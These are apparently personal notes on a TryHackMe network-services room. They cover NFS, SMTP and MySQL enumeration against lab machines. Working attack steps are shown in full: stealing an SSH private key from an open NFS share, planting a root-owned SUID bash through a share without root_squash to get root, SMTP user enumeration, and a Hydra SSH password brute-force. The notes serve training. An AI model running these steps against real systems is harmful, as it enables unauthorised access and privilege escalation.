Started notes late but i thought this was worth saving.

### NFS

`Conduct a thorough port scan scan of your choosing, how many ports are open?`

```php
└─$ sudo nmap -sS -A -p- -T4 $IP
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-02 03:22 EDT
Nmap scan report for 10.10.249.119
Host is up (0.024s latency).
Not shown: 65528 closed tcp ports (reset)
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 73:92:8e:04:de:40:fb:9c:90:f9:cf:42:70:c8:45:a7 (RSA)
|   256 6d:63:d6:b8:0a:67:fd:86:f1:22:30:2b:2d:27:1e:ff (ECDSA)
|_  256 bd:08:97:79:63:0f:80:7c:7f:e8:50:dc:59:cf:39:5e (ED25519)
111/tcp   open  rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
2049/tcp  open  nfs_acl  3 (RPC #100227)
46567/tcp open  nlockmgr 1-4 (RPC #100021)
54133/tcp open  mountd   1-3 (RPC #100005)
56211/tcp open  mountd   1-3 (RPC #100005)
58577/tcp open  mountd   1-3 (RPC #100005)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=7/2%OT=22%CT=1%CU=44445%PV=Y%DS=2%DC=T%G=Y%TM=6683A
OS:AF4%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)S
OS:EQ(SP=106%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M508ST11NW6%O2=M508ST
OS:11NW6%O3=M508NNT11NW6%O4=M508ST11NW6%O5=M508ST11NW6%O6=M508ST11)WIN(W1=F
OS:4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M
OS:508NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T
OS:4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+
OS:%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y
OS:%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%
OS:RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1723/tcp)
HOP RTT      ADDRESS
1   22.98 ms 10.9.0.1
2   23.01 ms 10.10.249.119

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 39.33 seconds
```

**A.** 7 ports are open

`Which port contains the service we're looking to enumerate?`

**A.** port 2049

`Now, use /usr/sbin/showmount -e [IP] to list the NFS shares, what is the name of the visible share?`

**A.** /home

```shell
└─$ /usr/sbin/showmount -e $IP
Export list for 10.10.249.119:
/home *
```

`Time to mount the share to our local machine!

`First, use "_mkdir /tmp/mount_" to create a directory on your machine to mount the share to. This is in the /tmp directory- so be aware that it will be removed on restart.`

`Then, use the mount command we broke down earlier to mount the NFS share to your local machine. Change directory to where you mounted the share- what is the name of the folder inside?`

---
**Mounting NFS shares**

Your client’s system needs a directory where all the content shared by the host server in the export folder can be accessed. You can create  
this folder anywhere on your system. Once you've created this mount point, you can use the "mount" command to connect the NFS share to the mount point on your machine like so:

**sudo mount -t nfs IP:share /tmp/mount/ -nolock**

---

`Then, use the mount command we broke down earlier to mount the NFS share to your local machine. Change directory to where you mounted the share- what is the name of the folder inside?`

**A.** cappucino

```php
┌──(kali㉿kali)-[~/Documents/tryhackme-notes/network2]
└─$ sudo mount -t nfs 10.10.249.119:home ~/Documents/tryhackme-notes/network2/mnt-share/ -nolock  
                                                                                                                     
┌──(kali㉿kali)-[~/Documents/tryhackme-notes/network2]
└─$ cd mnt-share 
                                                                                                                     
┌──(kali㉿kali)-[~/Documents/tryhackme-notes/network2/mnt-share]
└─$ ls
cappucino
```

`Interesting! Let's do a bit of research now, have a look through the folders. Which of these folde**rs** could cont**a**in keys that would give us remote access to the server?`

**A.** .ssh

```php
└─$ ls -la                                     
total 36
drwxr-xr-x 5 kali kali 4096 Jun  4  2020 .
drwxr-xr-x 3 root root 4096 Apr 21  2020 ..
-rw------- 1 kali kali    5 Jun  4  2020 .bash_history
-rw-r--r-- 1 kali kali  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 kali kali 3771 Apr  4  2018 .bashrc
drwx------ 2 kali kali 4096 Apr 22  2020 .cache
drwx------ 3 kali kali 4096 Apr 22  2020 .gnupg
-rw-r--r-- 1 kali kali  807 Apr  4  2018 .profile
drwx------ 2 kali kali 4096 Apr 22  2020 .ssh
-rw-r--r-- 1 kali kali    0 Apr 22  2020 .sudo_as_admin_successful
```

`Which of these keys is most useful to us?`

**A.** id_rsa

`Copy this file to a different location your local machine, and change the permissions to "600" using "chmod 600 [file]".

`Assuming we were right about what type of directory this is, we can pretty easily work out the name of the user this key corresponds to.`

`Can we log into the machine using _ssh -i <key-file> <username>@<ip>_ ? (Y/N)`

**A.** Yes

![[Pasted image 20240702084736.png]]

---

**We're done, right?**  

Not quite, if you have a low privilege shell on any machine and you found that a machine has an NFS share you might be able to use that to escalate privileges, depending on how it is configured.

**What is root_squash?**

By default, on NFS shares- Root Squashing is enabled, and prevents anyone connecting to the NFS share from having root access to the NFS volume. Remote root users are assigned a user “nfsnobody” when connected, which has the least local privileges. Not what we want. However, if this is turned off, it can allow the creation of SUID bit files, allowing a remote user root access to the connected system.

**SUID**

So, what are files with the SUID bit set? Essentially, this means that the file or files can be run with the permissions of the file(s) owner/group. In this case, as the super-user. We can leverage this to get a shell with these privileges!

**Method**

This sounds complicated, but really- provided you're familiar with how SUID files work, it's fairly easy to understand. We're able to upload files to the NFS share, and control the permissions of these files. We can set the permissions of whatever we upload, in this case a bash shell executable. We can then log in through SSH, as we did in the previous task- and execute this executable to gain a root shell!

**The Executable**

Due to compatibility reasons,  we will obtain the bash executable directly from the target machine.  
With the key obtained in the previous task, we can use SCP with the command `scp -i key_name username@10.10.249.119:/bin/bash ~/Downloads/bash` to download it onto our attacking machine.

Another method to overcome compatibility issues is to obtain a standard Ubuntu Server 18.04 bash executable, the same as the server's- as we know from our nmap scan. You can download it [here](https://github.com/TheRealPoloMints/Blog/blob/master/Security%20Challenge%20Walkthroughs/Networks%202/bash). If you want to download it via the command line, be careful not to download the github page instead of the raw script. You can use `wget https://github.com/polo-sec/writing/raw/master/Security%20Challenge%20Walkthroughs/Networks%202/bash`. Note that this method requires an internet connection, so you won't be able to download it when using a free AttackBox.

---

```shell
┌──(kali㉿kali)-[~/Documents/tryhackme-notes/network2]
└─$ scp -i id_rsa cappucino@10.10.249.119:/bin/bash ~/Downloads/bash
bash        
```

**Mapped Out Pathway:**

If this is still hard to follow, here's a step by step of the actions we're taking, and how they all tie together to allow us to gain a root shell:  
  

    NFS Access ->

        Gain Low Privilege Shell ->

            Upload Bash Executable to the NFS share ->

                Set SUID Permissions Through NFS Due To Misconfigured Root Squash ->

                    Login through SSH ->

                        Execute SUID Bit Bash Executable ->

                            ROOT ACCESS

1. `First, change directory to the mount point on your machine, where the NFS share should still be mounted, and then into the user's home directory.`
2. `Download the bash executable to your Downloads directory. Then use "cp ~/Downloads/bash ." to copy the bash executable to the NFS share. The copied bash shell must be owned by a root user, you can set this using "sudo chown root bash"`

```php
┌──(kali㉿kali)-[~/…/tryhackme-notes/network2/mnt-share/cappucino]
└─$ ls -la
total 1124
drwxr-xr-x 5 kali kali    4096 Jul  2 03:59 .
drwxr-xr-x 3 root root    4096 Apr 21  2020 ..
-rwxr-xr-x 1 root kali 1113504 Jul  2 03:59 bash
-rw------- 1 kali kali       5 Jun  4  2020 .bash_history
-rw-r--r-- 1 kali kali     220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 kali kali    3771 Apr  4  2018 .bashrc
drwx------ 2 kali kali    4096 Apr 22  2020 .cache
drwx------ 3 kali kali    4096 Apr 22  2020 .gnupg
-rw-r--r-- 1 kali kali     807 Apr  4  2018 .profile
drwx------ 2 kali kali    4096 Apr 22  2020 .ssh
-rw-r--r-- 1 kali kali       0 Apr 22  2020 .sudo_as_admin_successful
```

3. `Now, we're going to add the SUID bit permission to the bash executable we just copied to the share using "sudo chmod +[permission] bash". What letter do we use to set the SUID bit set using chmod?`

```shell
┌──(kali㉿kali)-[~/…/tryhackme-notes/network2/mnt-share/cappucino]
└─$ sudo chmod +s bash  
```

![[Pasted image 20240702090325.png]]

`Let's do a sanity check, let's check the permissions of the "bash" executable using "ls -la bash". What does the permission set look like? Make sure that it ends with -sr-x.`

**A.** -rwsr-sr-x

`Now, SSH into the machine as the user. List the directory to make sure the bash executable is there. Now, the moment of truth. Lets run it with "_./bash -p_". The -p persists the permissions, so that it can run as root with SUID- as otherwise bash will sometimes drop the permissions.`

![[Pasted image 20240702090643.png]]

`Great! If all's gone well you should have a shell as root! What's the root flag?`

```shell
bash-4.4# cd /root/
bash-4.4# ls
root.txt
bash-4.4# cat root.txt 
THM{nfs_got_pwned}
bash-4.4#
```

---

### SMTP

**What is SMTP?**

SMTP stands for "Simple Mail Transfer Protocol". It is utilised to handle the sending of emails. In order to support email services, a protocol pair is required, comprising of SMTP and POP/IMAP. Together they allow the user to send outgoing mail and retrieve incoming mail, respectively.

The SMTP server performs three basic functions:

-  It verifies who is sending emails through the SMTP server.
-  It sends the outgoing mail
-  If the outgoing mail can't be delivered it sends the message back to the sender

Most people will have encountered SMTP when configuring a new email address on some third-party email clients, such as Thunderbird; as when you configure a new email client, you will need to configure the SMTP server configuration in order to send outgoing emails.

**POP and IMAP**

POP, or "Post Office Protocol" and IMAP, "Internet Message Access Protocol" are both email protocols who are responsible for the transfer of email between a client and a mail server. The main differences is in POP's more simplistic approach of downloading the inbox from the mail server, to the client. Where IMAP will synchronise the current inbox, with new mail on the server, downloading anything new. This means that changes to the inbox made on one computer, over IMAP, will persist if you then synchronise the inbox from another computer. The POP/IMAP server is responsible for fulfiling this process.

**How does SMTP work?***

Email delivery functions much the same as the physical mail delivery system. The user will supply the email (a letter) and a service (the postal delivery service), and through a series of steps- will deliver it to the recipients inbox (postbox). The role of the SMTP server in this service, is to act as the sorting office, the email (letter) is picked up and sent to this server, which then directs it to the recipient.

We can map the journey of an email from your computer to the recipient’s like this:

![[Pasted image 20240702091309.png]]

The mail user agent, which is either your email client or an external program. connects to the SMTP server of your domain, e.g. smtp.google.com. This initiates the SMTP handshake. This connection works over the SMTP port- which is usually 25. Once these connections have been made and validated, the SMTP session starts.  

2. The process of sending mail can now begin. The client first submits the sender, and recipient's email address- the body of the email and any attachments, to the server.  

3. The SMTP server then checks whether the domain name of the recipient and the sender is the same.

4. The SMTP server of the sender will make a connection to the recipient's SMTP server before relaying the email. If the recipient's server can't be accessed, or is not available- the Email gets put into an SMTP queue.  

5. Then, the recipient's SMTP server will verify the incoming email. It does this by checking if the domain and user name have been recognised. The server will then forward the email to the POP or IMAP server, as shown in the diagram above.  

6. The E-Mail will then show up in the recipient's inbox.

This is a very simplified version of the process, and there are a lot of sub-protocols, communications and details that haven't been included. If you're looking to learn more about this topic, this is a really friendly to read breakdown of the finer technical details- I actually used it to write this breakdown:

[https://computer.howstuffworks.com/e-mail-messaging/email3.htm](https://computer.howstuffworks.com/e-mail-messaging/email3.htm)

**What runs SMTP?**

SMTP Server software is readily available on Windows server platforms, with many other variants of SMTP being available to run on Linux.  

**More Information:**

Here is a resource that explain the technical implementation, and working of, SMTP in more detail than I have covered here.

[https://www.afternerd.com/blog/smtp/](https://www.afternerd.com/blog/smtp/)

What does SMTP stand for?  
`Simple Mail Transfer Protocol`
What does SMTP handle the sending of? (answer in plural)  
`emails`
What is the first step in the SMTP process?  
`smtp handshake`
What is the default SMTP port?  
`25`
Where does the SMTP server send the email if the recipient's server is not available?  
`smtp queue`
On what server does the Email ultimately end up on?  
`pop/imap`
Can a Linux machine run an SMTP server? (Y/N)  
`y`
Can a Windows machine run an SMTP server? (Y/N)
`y`

---

### Enumerating SMTP

**Lets Get Started**

Before we begin, make sure to deploy the room and give it some time to boot. Please be aware, this can take up to five minutes so be patient!

**Enumerating Server Details**

Poorly configured or vulnerable mail servers can often provide an initial foothold into a network, but prior to launching an attack, we want to fingerprint the server to make our targeting as precise as possible. We're going to use the "_smtp_version_" module in MetaSploit to do this. As its name implies, it will scan a range of IP addresses and determine the version of any mail servers it encounters.

**Enumerating Users from SMTP**

The SMTP service has two internal commands that allow the enumeration of users: VRFY (confirming the names of valid users) and EXPN (which reveals the actual address of user’s aliases and lists of e-mail (mailing lists). Using these SMTP commands, we can reveal a list of valid users

We can do this manually, over a telnet connection- however Metasploit comes to the rescue again, providing a handy module appropriately called "_smtp_enum_" that will do the legwork for us! Using the module is a simple matter of feeding it a host or range of hosts to scan and a wordlist containing usernames to enumerate.

**Requirements**

As we're going to be using Metasploit for this, it's important that you have Metasploit installed. It is by default on both Kali Linux and Parrot OS; however, it's always worth doing a quick update to make sure that you're on the latest version before launching any attacks. You can do this with a simple "sudo apt update", and accompanying upgrade- if any are required.

**Alternatives**

It's worth noting that this enumeration technique will work for the majority of SMTP configurations; however there are other, non-metasploit tools such as smtp-user-enum that work even better for enumerating OS-level user accounts on Solaris via the SMTP service. Enumeration is performed by inspecting the responses to VRFY, EXPN, and RCPT TO commands.

This technique could be adapted in future to work against other vulnerable SMTP daemons, but this hasn’t been done as of the time of writing. It's an alternative that's worth keeping in mind if you're trying to distance yourself from using Metasploit e.g. in preparation for OSCP.  

Now we've covered the theory. Let's get going!

First, lets run a port scan against the target machine, same as last time. What port is SMTP running on?  

Okay, now we know what port we should be targeting, let's start up Metasploit. What command do we use to do this?

If you would like some more help or practice using Metasploit, TryHackMe has a module on Metasploit that you can check out here:

[https://tryhackme.com/module/metasploit](https://tryhackme.com/module/metasploit)  

---

```php
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sS -A -p- -T4 10.10.34.94 
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-02 04:35 EDT
Nmap scan report for 10.10.34.94
Host is up (0.036s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 62:a7:03:13:39:08:5a:07:80:1a:e5:27:ee:9b:22:5d (RSA)
|   256 89:d0:40:92:15:09:39:70:17:6e:c5:de:5b:59:ee:cb (ECDSA)
|_  256 56:7c:d0:c4:95:2b:77:dd:53:d6:e6:73:99:24:f6:86 (ED25519)
25/tcp open  smtp    Postfix smtpd
|_smtp-commands: polosmtp.home, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8
| ssl-cert: Subject: commonName=polosmtp
| Subject Alternative Name: DNS:polosmtp
| Not valid before: 2020-04-22T18:38:06
|_Not valid after:  2030-04-20T18:38:06
|_ssl-date: TLS randomness does not represent time
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=7/2%OT=22%CT=1%CU=34735%PV=Y%DS=2%DC=T%G=Y%TM=6683B
OS:C0D%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)O
OS:PS(O1=M508ST11NW6%O2=M508ST11NW6%O3=M508NNT11NW6%O4=M508ST11NW6%O5=M508S
OS:T11NW6%O6=M508ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)E
OS:CN(R=Y%DF=Y%T=40%W=F507%O=M508NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F
OS:=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5                                          
OS:(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z
OS:%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=
OS:N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%
OS:CD=S)

Network Distance: 2 hops
Service Info: Host:  polosmtp.home; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   22.40 ms 10.9.0.1
2   23.22 ms 10.10.34.94

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 43.31 seconds

```

```php
┌──(kali㉿kali)-[~]
└─$ smtp-user-enum -M VRFY -U /usr/share/wordlists/metasploit/unix_users.txt  -t 10.10.34.94 

======================

 ----------------------------------------------------------
|                   Scan Information                       |
 ----------------------------------------------------------

Mode ..................... VRFY
Worker Processes ......... 5
Usernames file ........... /usr/share/wordlists/metasploit/unix_users.txt
Target count ............. 1
Username count ........... 168
Target TCP port .......... 25
Query timeout ............ 5 secs
Target domain ............ 

######## Scan started at Tue Jul  2 04:42:49 2024 #########
10.10.34.94: irc exists
10.10.34.94: landscape exists
10.10.34.94: lp exists
10.10.34.94: list exists
10.10.34.94: lxd exists
10.10.34.94: mail exists
10.10.34.94: man exists
10.10.34.94: messagebus exists
10.10.34.94: news exists
10.10.34.94: nobody exists
10.10.34.94: pollinate exists
10.10.34.94: postmaster exists
10.10.34.94: postfix exists
10.10.34.94: proxy exists
10.10.34.94: root exists
10.10.34.94: ROOT exists
10.10.34.94: sshd exists
10.10.34.94: sync exists
10.10.34.94: sys exists
10.10.34.94: syslog exists
10.10.34.94: systemd-network exists
10.10.34.94: systemd-resolve exists
10.10.34.94: systemd-timesync exists
10.10.34.94: uucp exists
10.10.34.94: vagrant exists
10.10.34.94: uuidd exists
10.10.34.94: www-data exists
######## Scan completed at Tue Jul  2 04:43:45 2024 #########
27 results.
```

```php
┌──(kali㉿kali)-[~]
└─$ ls -la /usr/share/nmap/scripts | grep "smtp"
-rw-r--r-- 1 root root  4309 Mar 13 15:13 smtp-brute.nse
-rw-r--r-- 1 root root  4957 Mar 13 15:13 smtp-commands.nse
-rw-r--r-- 1 root root 12006 Mar 13 15:13 smtp-enum-users.nse
-rw-r--r-- 1 root root  5873 Mar 13 15:13 smtp-ntlm-info.nse
-rw-r--r-- 1 root root 10148 Mar 13 15:13 smtp-open-relay.nse
-rw-r--r-- 1 root root   716 Mar 13 15:13 smtp-strangeport.nse
-rw-r--r-- 1 root root 14781 Mar 13 15:13 smtp-vuln-cve2010-4344.nse
-rw-r--r-- 1 root root  7719 Mar 13 15:13 smtp-vuln-cve2011-1720.nse
-rw-r--r-- 1 root root  7603 Mar 13 15:13 smtp-vuln-cve2011-1764.nse
```

---


Let's search for the module "smtp_version", what's it's full module name?  
`auxiliary/scanner/smtp/smtp_version`
Great, now- select the module and list the options. How do we do this?  
`options`
Have a look through the options, does everything seem correct? What is the option we need to set?  
`RHOSTS`
Set that to the correct value for your target machine. Then run the exploit. What's the system mail name?  

```php
msf6 auxiliary(scanner/smtp/smtp_version) > exploit

[+] 10.10.34.94:25        - 10.10.34.94:25 SMTP 220 polosmtp.home ESMTP Postfix (Ubuntu)\x0d\x0a
[*] 10.10.34.94:25        - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

`polosmtp.home`

What Mail Transfer Agent (MTA) is running the SMTP server? This will require some external research.  
`postfix`
Good! We've now got a good amount of information on the target system to move onto the next stage. Let's search for the module "_smtp_enum_", what's it's full module name?
`auxiliary/scanner/smtp/smtp_enum`
We're going to be using the _"top-usernames-shortlist.txt"_ wordlist from the Usernames subsection of seclists (/usr/share/wordlists/SecLists/Usernames if you have it installed).

Seclists is an amazing collection of wordlists. If you're running Kali or Parrot you can install seclists with: "sudo apt install seclists" Alternatively, you can download the repository from [here](https://github.com/danielmiessler/SecLists).  

What option do we need to set to the wordlist's path?  
`user_file`
Once we've set this option, what is the other essential paramater we need to set?
`rhosts`
Now, run the exploit, this may take a few minutes, so grab a cup of tea, coffee, water. Keep yourself hydrated!

Okay! Now that's finished, what username is returned?
`administrator`

```php
msf6 auxiliary(scanner/smtp/smtp_enum) > exploit

[*] 10.10.34.94:25        - 10.10.34.94:25 Banner: 220 polosmtp.home ESMTP Postfix (Ubuntu)
[+] 10.10.34.94:25        - 10.10.34.94:25 Users found: administrator
[*] 10.10.34.94:25        - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

smtp-user-enum

```php
┌──(kali㉿kali)-[~]
└─$ smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t 10.10.34.94
Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )

 ----------------------------------------------------------
|                   Scan Information                       |
 ----------------------------------------------------------

Mode ..................... VRFY
Worker Processes ......... 5
Usernames file ........... /usr/share/seclists/Usernames/top-usernames-shortlist.txt
Target count ............. 1
Username count ........... 17
Target TCP port .......... 25
Query timeout ............ 5 secs
Target domain ............ 

######## Scan started at Tue Jul  2 05:40:07 2024 #########
10.10.34.94: root exists
10.10.34.94: administrator exists
10.10.34.94: vagrant exists
######## Scan completed at Tue Jul  2 05:40:07 2024 #########
3 results.

17 queries in 1 seconds (17.0 queries / sec)
```

```php
┌──(kali㉿kali)-[~]
└─$ nmap -script smtp-enum-users.nse --script-args smtp-enum-users.methods={EXPN} -p25 10.10.34.94

Nmap scan report for 10.10.34.94
Host is up (0.024s latency).

PORT   STATE SERVICE
25/tcp open  smtp
| smtp-enum-users: 
|_  Couldnt find any accounts

Nmap done: 1 IP address (1 host up) scanned in 0.61 seconds

```

I don't think i'm not doing nmap correctly, so i'm leaving it for now.
- Maybe i needed to add a wordlist, which would make sense.
- i don't think you can add a pass file

---

**What do we know?**

Okay, at the end of our Enumeration section we have a few vital pieces of information:

1. A user account name  

2. The type of SMTP server and Operating System running.

We know from our port scan, that the only other open port on this machine is an SSH login. We're going to use this information to try and **bruteforce** the password of the SSH login for our user using Hydra.

**Preparation**

It's advisable that you exit Metasploit to continue the exploitation of this section of the room. Secondly, it's useful to keep a note of the information you gathered during the enumeration stage, to aid in the exploitation.  

**Hydra**

There is a wide array of customisability when it comes to using Hydra, and it allows for adaptive password attacks against of many different services, including SSH. Hydra comes by default on both Parrot and Kali, however if you need it, you can find the GitHub [here](https://github.com/vanhauser-thc/thc-hydra).

Hydra uses dictionary attacks primarily, both Kali Linux and Parrot OS have many different wordlists in the "_/usr/share/wordlists_" directory- if you'd like to browse and find a different wordlists to the widely used "rockyou.txt". Likewise I recommend checking out SecLists for a wider array of other wordlists that are extremely useful for all sorts of purposes, other than just password cracking. E.g. subdomain enumeration  

The syntax for the command we're going to use to find the passwords is this:

**"hydra -t 16 -l USERNAME -P /usr/share/wordlists/rockyou.txt -vV 10.10.13.32 ssh"**

Let's break it down:


![[Pasted image 20240703011708.png]]

_What is the password of the user we found during our enumeration stage?_

**alejandro**

_Great! Now, let's SSH into the server as the user, what is contents of smtp.txt_

**THM{who_knew_email_servers_were_c00l?}**

![[Pasted image 20240703011911.png]]

---

### MySQL

**What is MySQL?**

In its simplest definition, MySQL is a relational database management system (RDBMS) based on Structured Query Language (SQL). Too many acronyms? Let's break it down:

**Database:**

A database is simply a persistent, organised collection of structured data

**RDBMS:**

A software or service used to create and manage databases based on a relational model. The word "relational" just means that the data stored in the dataset is organised as tables. Every table relates in some way to each other's "primary key" or other "key" factors.  

**SQL:**

MYSQL is just a brand name for one of the most popular RDBMS software implementations. As we know, it uses a client-server model. But how do the client and server communicate? They use a language, specifically the Structured Query Language (SQL).  

Many other products, such as PostgreSQL and Microsoft SQL server, have the word SQL in them. This similarly signifies that this is a product utilising the Structured Query Language syntax.  

****How does MySQL work?****

  
MySQL, as an RDBMS, is made up of the server and utility programs that help in the administration of MySQL databases.

The server handles all database instructions like creating, editing, and accessing data. It takes and manages these requests and communicates using the MySQL protocol. This whole process can be broken down into these stages:  

1. MySQL creates a database for storing and manipulating data, defining the relationship of each table.
2. Clients make requests by making specific statements in SQL.
3. The server will respond to the client with whatever information has been requested.  
    

******What runs MySQL?******

MySQL can run on various platforms, whether it's Linux or windows. It is commonly used as a back end database for many prominent websites and forms an essential component of the LAMP stack, which includes: Linux, Apache, MySQL, and PHP.

**More Information:**

Here are some resources that explain the technical implementation, and working of, MySQL in more detail than I have covered here:

[https://dev.mysql.com/doc/dev/mysql-server/latest/PAGE_SQL_EXECUTION.html](https://dev.mysql.com/doc/dev/mysql-server/latest/PAGE_SQL_EXECUTION.html) 

[https://www.w3schools.com/php/php_mysql_intro.asp](https://www.w3schools.com/php/php_mysql_intro.asp)

---

_What type of software is MySQL?_

**relational database management system**

_What language is MySQL based on?_

**SQL**

_What communication model does MySQL use?_ 

**client-server**

_What is a common application of MySQL?_ 

**back end database**

_What major social network uses MySQL as their back-end database? This will require further research._

**Facebook**

---

### Enumerate SQL

**Let's Get Started**

Before we begin, make sure to deploy the room and give it some time to boot. Please be aware, as this can take up to five minutes, so be patient!

**When you would begin attacking MySQL**

MySQL is likely not going to be the first point of call when getting initial information about the server. You can, as we have in previous tasks, attempt to brute-force default account passwords if you really don't have any other information; however, in most CTF scenarios, this is unlikely to be the avenue you're meant to pursue.

**The Scenario**  

Typically, you will have gained some initial credentials from enumerating other services that you can then use to enumerate and exploit the MySQL service. As this room focuses on exploiting and enumerating the network service, for the sake of the scenario, we're going to assume that you found the **credentials: "root:password"** while enumerating subdomains of a web server. After trying the login against SSH unsuccessfully, you decide to try it against MySQL.

**Requirements**

You will want to have MySQL installed on your system to connect to the remote MySQL server. In case this isn't already installed, you can install it using `sudo apt install default-mysql-client`. Don't worry- this won't install the server package on your system- just the client.  

Again, we're going to be using Metasploit for this; it's important that you have Metasploit installed, as it is by default on both Kali Linux and Parrot OS.

**Alternatives**

As with the previous task, it's worth noting that everything we will be doing using Metasploit can also be done either manually or with a set of non-Metasploit tools such as nmap's mysql-enum script: [https://nmap.org/nsedoc/scripts/mysql-enum.html](https://nmap.org/nsedoc/scripts/mysql-enum.html) or [https://www.exploit-db.com/exploits/23081](https://www.exploit-db.com/exploits/23081). I recommend that after you complete this room, you go back and attempt it manually to make sure you understand the process that is being used to display the information you acquire.

Okay, enough talk. Let's get going!

---
#### nmap

```php
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sS -A -T4 10.10.14.213
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-02 20:43 EDT
Nmap scan report for 10.10.14.213
Host is up (0.024s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 06:36:56:2f:f0:d4:a4:d2:ab:6a:43:3e:c0:f9:9b:2d (RSA)
|   256 30:bd:be:28:bd:32:dc:f6:ff:28:b2:57:57:31:d9:cf (ECDSA)
|_  256 f2:3b:82:4a:5c:d2:18:19:89:1f:cd:92:0a:c7:cf:65 (ED25519)
3306/tcp open  mysql   MySQL 5.7.29-0ubuntu0.18.04.1
| ssl-cert: Subject: commonName=MySQL_Server_5.7.29_Auto_Generated_Server_Certificate
| Not valid before: 2020-04-23T10:13:27
|_Not valid after:  2030-04-21T10:13:27
|_ssl-date: TLS randomness does not represent time
| mysql-info: 
|   Protocol: 10
|   Version: 5.7.29-0ubuntu0.18.04.1
|   Thread ID: 3
|   Capabilities flags: 65535
|   Some Capabilities: LongPassword, SupportsCompression, Support41Auth, FoundRows, SwitchToSSLAfterHandshake, Speaks41ProtocolOld, SupportsTransactions, ConnectWithDatabase, IgnoreSigpipes, ODBCClient, DontAllowDatabaseTableColumn, InteractiveClient, IgnoreSpaceBeforeParenthesis, Speaks41ProtocolNew, SupportsLoadDataLocal, LongColumnFlag, SupportsAuthPlugins, SupportsMultipleResults, SupportsMultipleStatments
|   Status: Autocommit
|   Salt: JG\x1C5T3^v\x0E<wx_\x04_-\x08)d&
|_  Auth Plugin Name: mysql_native_password
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=7/2%OT=22%CT=1%CU=35617%PV=Y%DS=2%DC=T%G=Y%TM=66849
OS:EA6%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=A)O
OS:PS(O1=M508ST11NW6%O2=M508ST11NW6%O3=M508NNT11NW6%O4=M508ST11NW6%O5=M508S
OS:T11NW6%O6=M508ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)E
